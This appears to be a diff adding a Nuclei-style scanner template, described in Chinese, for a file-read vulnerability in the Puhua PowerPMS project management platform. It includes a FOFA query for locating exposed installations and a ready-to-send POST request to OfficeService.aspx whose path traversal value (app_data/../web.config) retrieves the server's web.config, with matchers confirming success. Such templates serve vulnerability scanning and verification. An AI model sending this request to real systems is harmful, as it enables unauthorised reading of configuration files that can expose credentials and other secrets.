@@ -1,0 +1,32 @@
+id: powerpms-officeservice-file-read
+
+info:
+  name: "普华PowerPMS系统OfficeService.aspx接口存在文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+          普华PowerPMS是上海普华科技发展股份有限公司开发的项目管理信息平台。该系统OfficeService.aspx接口存在文件读取安全缺陷，攻击者可通过构造特定请求访问受限文件内容，导致敏感数据暴露。
+  tags: 普华科技-PowerPMS
+
+
+http:
+- raw:
+  - |
+    POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=download&WEBURL=app_data/../web.config
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'http://go.microsoft.com'
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
